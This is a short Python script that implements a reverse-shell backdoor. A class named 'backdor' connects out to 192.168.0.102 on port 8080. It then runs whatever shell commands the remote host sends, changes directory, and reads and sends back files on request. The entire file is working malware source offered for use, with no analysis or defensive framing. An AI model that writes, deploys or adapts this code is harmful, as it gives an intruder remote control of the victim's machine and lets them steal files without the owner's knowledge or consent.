import socket
import subprocess
import json
import os

class backdor:
    '''define a class'''

    def __init__(self, ip, ports):
        self.connected = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected.connect((ip, ports))
        # connected.send("[+] Connection establisted.\n".encode())
    
    def use_for_system_command(self, commnd):
        '''define a function'''
        try:
            return subprocess.check_output(commnd, shell=True)
        except subprocess.CalledProcessError:
            return f"Command '{commnd}' returned non-zero exit status 1".encode("utf-8")
        

    def command_send(self, deta):
        '''define a function in this function send data in server client'''
        json_data = json.dumps(deta)
        encode_data = json_data.encode("utf-8")
        self.connected.send(encode_data)


    def command_receive(self):
        '''receive command use this function'''
        json_data = self.connected.recv(1024)
        decode_data = json_data.decode("utf-8")
        return json.loads(decode_data)
    
    
    def change_dir(self, path):
        '''this function use to for change the working directory'''
        os.chdir(path)
        return os.getcwd()


    def read_file(self, file_path):
        '''this function use to open a txt file use to binary mode'''
        with open(file_path, "rb") as bin:
            return bin.read()


    def run(self):
        '''this function use to run all auto function'''
        while True:
            comd = self.command_receive()
            if comd[0]=="exit":
                self.connected.close()
                break
            
            elif comd[0]=="cd":
                try:
                    self.system_data = self.change_dir(comd[1]).encode("utf-8")
                except OSError:
                    self.command_send(f"cannot find the specified path: {comd[1]}")            

            elif comd[0]=="read":
                reciv_cmd = " ".join(comd)
                try:
                    self.system_data = self.read_file(reciv_cmd[5:])
                except OSError:
                    self.command_send(f"No such file or directory: {reciv_cmd[5:]}")
            
            elif comd[0]=="downlod":
                self.system_data = self.read_file(comd[1])

            else:
                self.system_data = self.use_for_system_command(comd[0])
    
            self.command_send(self.system_data.decode("utf-8"))




dor = backdor("192.168.0.102", 8080)
dor.run()


#all write by Mr.pydor